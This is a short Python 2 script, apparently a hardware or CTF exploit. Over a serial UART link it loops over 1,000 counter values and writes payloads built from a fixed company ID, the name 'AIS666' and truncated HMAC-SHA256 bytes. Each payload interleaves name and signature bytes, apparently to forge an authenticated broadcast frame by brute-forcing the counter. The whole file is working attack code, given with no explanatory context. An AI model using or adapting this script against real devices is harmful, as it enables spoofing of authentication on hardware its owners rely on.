#!/usr/bin/env python
# -*- coding: utf-8 -*-
import serial, time
import hmac, hashlib


def exp(i):
    ser = serial.Serial('/dev/tty.SLAB_USBtoUART', 115200, timeout=1)

    #---------------------------------------------------------------------------------------------
    #| 00 | 01 | 02 | 03 |  04 | 05 |  06 | 07 |  08 | 09 |  10 |   11 |  12 |   13 |  14 |   15 |
    #---------------------------------------------------------------------------------------------
    #|  L |  T | 46 | 00 | ID1 | R1 | ID2 | R2 | ID3 | R3 | ID4 | SIG1 | ID5 | SIG2 | ID6 | SIG3 |
    #---------------------------------------------------------------------------------------------


    company_name = "\x46\x00"
    #name = "deaddeadbeef".decode('hex')
    name = "AIS666"
    random_num = [0x01, 0x02, 0x03]
    count = i

    key = [random_num[0], random_num[1], random_num[2] ]
    key.append(count & 0xff)
    key.append((count >> 8) & 0xff)
    key.append((count >> 16) & 0xff)

    print "name : " + name.encode('hex')

    key = ''.join(map(chr, key))
    print "key  : " + key.encode('hex')

    hmac_data = hmac.new(key, msg=name, digestmod=hashlib.sha256).digest()
    print "hmac : " + hmac_data.encode('hex')

    payload = company_name + name[:1] + chr(random_num[0])
    payload += name[1:2] + chr(random_num[1])
    payload += name[2:3] + chr(random_num[2])
    payload += name[3:4] + hmac_data[:1]
    payload += name[4:5] + hmac_data[1:2]
    payload += name[5:6] + hmac_data[2:3]
    print "payload : " + payload.encode('hex')


    ser.write("b" + payload)
    ser.readline()
    print "[+] " + ser.readline()
    time.sleep(4)


for i in range(0,1000):
    exp(i)

